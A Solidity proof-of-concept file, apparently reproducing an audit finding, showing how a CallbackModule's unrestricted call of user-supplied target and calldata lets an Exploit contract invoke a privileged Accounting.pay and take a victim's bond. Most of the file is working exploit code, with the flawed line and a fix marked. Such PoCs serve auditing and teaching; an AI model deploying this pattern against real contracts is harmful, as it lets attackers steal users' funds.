// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Wonderland Prophet CallbackModule — Trail of Bits, May 2024
    finalizeRequest performs `_params.target.call(_params.data)` with the
    requester's target and calldata. The module is onlyAllowedModule on
    Accounting.pay, so a callback aimed at pay() moves another user's bond
    to the attacker. Here the victim's 1000-unit bond is paid to Exploit.

    Verbatim: _params.target.call(_params.data);
*/

contract BondToken {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Accounting {
    BondToken public token;
    address public allowedModule;
    mapping(address => uint256) public bonded;

    constructor(BondToken _token) {
        token = _token;
    }

    function setModule(address module) external {
        require(allowedModule == address(0), "module");
        allowedModule = module;
    }

    function bond(address user, uint256 amount) external {
        bonded[user] += amount;
    }

    function pay(address from, address to, uint256 amount) external {
        require(msg.sender == allowedModule, "onlyAllowedModule");
        bonded[from] -= amount;
        require(token.transfer(to, amount), "pay");
    }
}

contract CallbackModule {
    address public oracle;
    Accounting public accounting;

    event Callback(address target, bytes data);

    struct RequestParameters {
        address target;
        bytes data;
    }

    modifier onlyOracle() {
        require(msg.sender == oracle, "onlyOracle");
        _;
    }

    constructor(Accounting _accounting) {
        accounting = _accounting;
    }

    function setOracle(address _oracle) external {
        require(oracle == address(0), "oracle");
        oracle = _oracle;
    }

    function decodeRequestData(bytes memory finalityModuleData) public pure returns (RequestParameters memory _params) {
        (address target, bytes memory data) = abi.decode(finalityModuleData, (address, bytes));
        _params.target = target;
        _params.data = data;
    }

    function finalizeRequest(bytes calldata finalityModuleData) external onlyOracle {
        RequestParameters memory _params = decodeRequestData(finalityModuleData);
        _params.target.call(_params.data); // @> VULN: user-chosen target and calldata run with module privileges
        // FIX: call a fixed notifier interface; do not forward arbitrary calldata
        emit Callback(_params.target, _params.data);
    }

    /// @notice Fixed interface. Not used by run().
    function finalizeFixed(address notifier) external onlyOracle {
        (bool ok,) = notifier.call(abi.encodeWithSignature("ping()"));
        require(ok, "ping");
    }
}

contract Oracle {
    CallbackModule public module;

    constructor(CallbackModule _module) {
        module = _module;
    }

    function finalize(bytes calldata finalityModuleData) external {
        module.finalizeRequest(finalityModuleData);
    }

    function finalizeFixed(address notifier) external {
        module.finalizeFixed(notifier);
    }
}

contract Notifier {
    function ping() external pure returns (bool) {
        return true;
    }
}

contract Exploit {
    address public constant VICTIM = address(0x2222222222222222222222222222222222222222);

    BondToken public token; // CREATE nonce 1
    Accounting public accounting; // CREATE nonce 2
    CallbackModule public module; // CREATE nonce 3 — vulnerable
    Oracle public oracle; // CREATE nonce 4
    Notifier public notifier; // CREATE nonce 5

    constructor() {
        token = new BondToken();
        accounting = new Accounting(token);
        module = new CallbackModule(accounting);
        oracle = new Oracle(module);
        notifier = new Notifier();
        accounting.setModule(address(module));
        module.setOracle(address(oracle));
        token.mint(address(accounting), 1000 ether);
        accounting.bond(VICTIM, 1000 ether);
    }

    function run() external {
        bytes memory data = abi.encodeWithSignature(
            "pay(address,address,uint256)", VICTIM, address(this), 1000 ether
        );
        bytes memory moduleData = abi.encode(address(accounting), data);
        oracle.finalize(moduleData);
        require(token.balanceOf(address(this)) == 1000 ether, "attacker received the bond");
        require(accounting.bonded(VICTIM) == 0, "victim bond cleared");
        require(token.balanceOf(address(accounting)) == 0, "accounting emptied");
    }
}
